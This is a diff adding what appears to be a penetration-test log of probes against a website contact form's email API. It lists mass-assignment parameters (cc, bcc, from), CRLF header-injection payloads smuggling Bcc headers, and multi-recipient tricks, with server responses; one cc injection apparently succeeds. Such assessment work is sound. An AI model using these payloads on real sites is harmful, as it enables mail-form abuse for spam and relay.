@@ -1,0 +1,38 @@
+### 1. baseline form submit (quota may be exhausted)
+('HTTP/2 200', 'MISS', b'{"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded"}}')
+
+### 2. field-by-field: which fields are REQUIRED / validated? (looking for error messages)
+ empty body             -> ('HTTP/2 500', 'MISS', b'')
+ only targets           -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded","statusCode":429}}')
+ no check(honeypot)     -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded","statusCode":429}}')
+ no targets             -> ('HTTP/2 500', 'MISS', b'')
+ invalid email          -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"statusCode":422,"name":"validation_error","message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format."}}')
+
+### 3. MASS ASSIGNMENT: do extra provider fields get honoured? (from/cc/bcc/replyTo)
+ &from=attacker@x.yz          -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded"}}')
+ &cc=vaptcc@pro.be.alce       -> ('HTTP/2 200', 'MISS', b'{"data":{"id":"01a0f18c-3686-74d6-8c0e-441ce443d1fb"},"error":null}')
+ &bcc=vaptbcc@pro.be.alce     -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded"}}')
+ &reply_to=vaptr@pro.be.alce  -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded","statusCode":429}}')
+ &replyTo=vaptr2@pro.be.alce  -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded","statusCode":429}}')
+ &from_name=ACME              -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded"}}')
+ &attachments=1               -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded"}}')
+
+### 4. CRLF / header injection in email + subject fields
+ targets=vapt%0d%0aBcc:vaptbcc@pro.be.alce                  -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format.","name":"validation_error","statusCode":422}}')
+ targets=vapt@pro.be.alce%0aBcc:vaptbcc@pro.be.alce         -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded","statusCode":429}}')
+ subject=Probe%0d%0aBcc%3a%20vaptbcc@pro.be.alce            -> ('HTTP/2 500', 'MISS', b'')
+ cname=VAPT%0d%0aX-Injected:%20yes                          -> ('HTTP/2 500', 'MISS', b'')
+ msg=hello%0d%0aBcc:vaptbcc@pro.be.alce                     -> ('HTTP/2 500', 'MISS', b'')
+
+### 5. multiple recipients in targets (list / comma / repeated param)
+ targets=v1@pro.be.alce,v2@pro.be.alce                      -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded","statusCode":429}}')
+ targets=v1@pro.be.alce&targets=v2@pro.be.alce              -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exceeded","statusCode":429}}')
+ targets[]=v1@pro.be.alce&targets[]=v2@pro.be.alce          -> ('HTTP/2 500', 'MISS', b'')
+ targets=["v1@pro.be.alce","v2@pro.be.alce"]                -> ('HTTP/2 200', 'MISS', b'{"data":null,"error":{"statusCode":422,"name":"validation_error","message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format."}}')
+
+### 6. method / content-type matrix
+ GET      HTTP/2 405
+ PUT      HTTP/2 405
+ DELETE   HTTP/2 405
+ PATCH    HTTP/2 405
+ OPTIONS  HTTP/2 204
